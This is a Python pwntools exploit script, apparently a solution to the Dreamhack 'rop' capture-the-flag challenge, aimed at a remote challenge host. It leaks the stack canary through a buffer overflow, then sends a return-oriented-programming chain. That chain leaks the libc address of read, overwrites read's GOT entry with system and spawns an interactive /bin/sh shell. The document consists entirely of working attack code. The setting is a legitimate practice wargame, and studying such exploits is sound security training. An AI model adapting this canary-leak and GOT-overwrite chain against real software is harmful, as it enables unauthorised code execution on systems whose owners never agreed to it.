from pwn import *

# context.log_level = 'debug'
context(arch='amd64', os='linux')

p = remote('host3.dreamhack.games', 18486)
# p = process('./rop', env= {"LD_PRELOAD" : "./libc.so.6"})

e = ELF('./rop')
libc = ELF('./libc.so.6')

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

# gadget
pop_rdi = 0x400853
pop_rsi_r15 = 0x400851
ret = 0x400596

buf1 = b'A' * 0x39
p.sendafter('Buf: ', buf1)

# canary leak
p.recvuntil(buf1)
canary = u64(b'\x00' + p.recvn(7))
log.info(f'canary : {hex(canary)}')

# payload
payload = b'A' * 0x38
payload += p64(canary)
payload += b'A' * 0x8

# write(1, read_got, ...)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(read_got)
payload += p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

# read("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

# pause()

p.sendafter('Buf: ', payload)

# libc base
read_addr = u64(p.recvn(8))
libc_base = read_addr - libc.symbols['read']
log.info(f'read : {hex(read_addr)}')

# system
system = libc_base + libc.symbols['system']
log.info(f'system : {hex(system)}')

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()